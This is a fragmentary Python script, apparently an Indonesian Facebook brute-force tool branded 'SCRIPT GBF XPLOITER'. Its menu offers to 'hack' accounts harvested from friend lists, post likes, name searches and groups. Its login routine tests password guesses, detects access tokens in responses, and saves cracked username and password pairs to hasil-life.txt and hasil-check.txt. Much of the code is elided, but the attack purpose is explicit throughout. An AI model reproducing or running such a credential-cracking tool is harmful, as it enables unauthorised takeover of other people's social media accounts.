...
def baner():
    time.sleep(0.1)
    kata("""\n\t\033[90m~  ~  ~\033[92m┌∩┐\033[94m(\033[91m|=∆=|\033[94m)\033[92m┌∩┐\033[90m~  ~  ~
\t\033[00m SCRIPT GBF XPLOITER 
\t\033[90m -----------------------\033[94m\n
===========================================\033[00m
Creator \033[1;91m: \033[1;96mTn Tiger01\033[00m
website \033[1;91m: \033[1;96mGaruda_BreakNews\033[00m
Contact  \033[1;91m: \033[4;92mhttps://wa.me/621331369655\033[00m
\033[94m===========================================\033[00m""")
def balik():
    f=input("\033[00m\t[\033[96mEnter Untuk Kembali\033[00m]")
    if f == "":
       os.system("python GBF.py")
    else:
       sys.exit("\033[1;91mKeluar\033[00m")
def mbf():
    time.sleep(0.1)
    print("\033[00m[\033[93m1\033[00m] Masuk")
    print("\033[00m[\033[93m2\033[00m] Perbarui Script")
    ...
    if f == "1":
         ...
         def masuk():
             ...
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                           ...
                           print("\033[90m> \033[00mMencoba Bahasa, Mohon tunggu...\033[1;91m!!\033[00m")
                           try:
         ...
         def login(username,password,cek=False):
             ...
             if 'EAA' in response.text:
                 ...
                 if cek:
                        ...
                        with open('hasil-life.txt','a') as f:
                   ...
                   if cek:
                           ...
                           with open('hasil-check.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(hasil)}\033[90m) \033[00mgagal : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
         ...
         if __name__ == '__main__':
               try:
                   ...
                   clear()
                   baner()
                   kata('\033[1;97m[\033[1;93m1\033[1;97m] \033[00mHack Daftar Teman')
                   kata('\033[1;97m[\033[1;93m2\033[1;97m] \033[00mHack Dari Like Post\033[1;97m ')
                   kata('\033[1;97m[\033[1;93m3\033[1;97m] \033[00mHack Dari Pencarian Nama')
                   kata('\033[1;97m[\033[1;93m4\033[1;97m] \033[00mHack Dari Grup ')
                   kata('\033[1;97m[\033[1;93m5\033[1;97m] \033[00mHack Dari Teman')
                   kata('\033[1;97m[\033[1;93m6\033[1;97m] \033[00mLihat Hasil Hack')
                   kata('\033[94m===========================================\033[0m\n')
                   print()
                   ...
                   if tanya =="":
                         ...
                         try:
                                 ...
                                 exit("\033[00m[\033[91m!\033[00m] pengguna tidak ditemukan")
                   elif tanya == '6':
                         try:
                                 file1 = open("hasil-check.txt").read()
                                 file2 = open("hasil-life.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 ...
                                 os.remove("hasil-check.txt")
                                 os.remove("hasil-life.txt")
                                 for x in life:
                                         with open('hasil-life.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                 ...
                                 print("\033[90m> \033[00msimpan di \033[1;93mhasil-check.txt\033[90m|\033[1;92mhasil-life.txt")
                         except FileNotFoundError:
                                 exit("\033[00m[\033[91m!\033[00m] gagal membuka hasil")
                   else:
                   ...
                   if check != 0 or result != 0:
                           ...
                           print("\033[1;94m===========================================\033[00m")
                           print("\n\033[00m[\033[92m✓\033[00m] Selesai")
                           print("\033[00m[\033[92m✓\033[00m]life : \033[92mhasil-life.txt\033[00m")
                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mhasil-check.txt\033[00m")
                           print("\n\n")
                       ...
                       exit("\033[00m[\033[91m!\033[00m] Gagal menyambung")
         ...
         os.system("xdg-open https://chat.whatsapp.com/FiGAa17T3X3HNKhM018AhT")
         balik()
